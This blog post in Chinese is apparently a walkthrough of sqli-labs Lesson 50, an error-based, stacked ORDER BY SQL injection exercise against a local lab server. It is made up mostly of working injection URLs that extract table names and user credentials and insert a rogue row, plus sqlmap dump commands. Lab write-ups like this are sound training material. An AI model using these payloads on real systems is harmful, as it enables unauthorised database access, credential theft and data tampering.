---
title: sqli-labs lession-50-GET 基于错误-数字型堆叠注入-OrderBy注入
date: 2018-11-09 09:06:13
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-50-GET 基于错误-数字型堆叠注入-OrderBy注入

---

## 登录界面

![001](/img/sql/Lesson-50/001.png)

## 注入

### 判断注入类型

![002](/img/sql/Lesson-50/002.png)

判断为数字型

### 获取数据库名

`http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,database(),0x7e))%23`

![003](/img/sql/Lesson-50/003.png)

### 获取表名

`http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security'),0x7e))%23`

![004](/img/sql/Lesson-50/004.png)

### 获取列名

`http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users'),0x7e))%23`

![005](/img/sql/Lesson-50/005.png)

### 获取字段

`http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,(select concat(0x7e,username,0x7e,password)from security.users limit 0,1),0x7e))%23`

![006](/img/sql/Lesson-50/006.png)

## 堆叠注入

`http://10.60.17.35:8082/Less-50/?sort=1;insert into users(id,username,password)values(100,'huai','dan');%23`

![007](/img/sql/Lesson-50/007.png)

## SQLMAP

`sqlmap -u "http://10.60.17.35:8082/Less-50/?sort=1" --dbms mysql --technique E`

![008](/img/sql/Lesson-50/008.png)

![009](/img/sql/Lesson-50/009.png)

`sqlmap -u "http://10.60.17.35:8082/Less-50/?sort=1" --dbms mysql --technique E -D security -T users --columns --dump`

![010](/img/sql/Lesson-50/010.png)

![011](/img/sql/Lesson-50/011.png)

